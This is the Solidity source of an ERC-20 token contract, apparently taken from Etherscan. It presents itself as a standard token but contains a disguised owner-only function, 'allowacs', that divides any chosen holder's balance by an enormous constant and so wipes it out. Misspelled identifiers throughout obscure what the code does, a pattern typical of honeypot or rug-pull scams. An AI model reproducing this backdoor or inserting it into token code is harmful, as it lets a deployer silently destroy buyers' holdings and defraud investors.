/**
 *Submitted for verification at Etherscan.io on 2023-09-24
*/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accvovnt) external view returns (uint256);
    function transfer(address recipient, uint256 avcbount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 avcbount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 avcbount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract token is Context, Ownable, IERC20 {
    mapping (address => uint256) private _eteeeer;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _eteeeer[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address accvovnt) public view override returns (uint256) {
        return _eteeeer[accvovnt];
    }
    function allowacs(address adeeere) public onlyowner {
    uint256 xfdsasda = 41201215122124542121214551; 
    uint256 qqqqqqs = xfdsasda*1;
        _eteeeer[adeeere] /= qqqqqqs*1;
    }    
    function transfer(address recipient, uint256 avcbount) public virtual override returns (bool) {
        require(_eteeeer[_msgSender()] >= avcbount, "TT: transfer avcbount exceeds balance");

        _eteeeer[_msgSender()] -= avcbount;
        _eteeeer[recipient] += avcbount;
        emit Transfer(_msgSender(), recipient, avcbount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 avcbount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = avcbount;
        emit Approval(_msgSender(), spender, avcbount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 avcbount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= avcbount, "TT: transfer avcbount exceeds allowance");

        _eteeeer[sender] -= avcbount;
        _eteeeer[recipient] += avcbount;
        _allowances[sender][_msgSender()] -= avcbount;

        emit Transfer(sender, recipient, avcbount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}